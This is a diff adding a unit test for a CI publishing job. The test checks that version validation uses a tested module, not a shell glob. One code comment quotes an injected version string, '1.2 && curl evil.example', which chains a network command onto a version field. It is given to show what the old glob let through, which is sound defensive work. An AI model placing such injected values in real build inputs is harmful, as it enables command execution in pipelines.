@@ -119,6 +119,14 @@ describe("the AMO submission job", () => {
     expect(checkout!.with?.ref).toBeUndefined();
   });
 
+  it("validates the package version with the tested module, not a shell glob", () => {
+    // The glob this replaced — [0-9]*.[0-9]* — accepted 0abc.9xyz, 2.01, 1.2-beta and
+    // `1.2 && curl evil.example`. A validator nobody can unit-test is how that survives.
+    const unpack = job.steps.find((s) => s.name?.startsWith("Unpack"));
+    expect(unpack!.run).toContain("amoApi.mjs check-version");
+    expect(unpack!.run).not.toMatch(/case "\$VERSION" in/);
+  });
+
   it("pins web-ext to an exact version", () => {
     // A publishing path that installs whatever is newest today is not reproducible: the run that
     // ships a release should behave like the run that tested it.
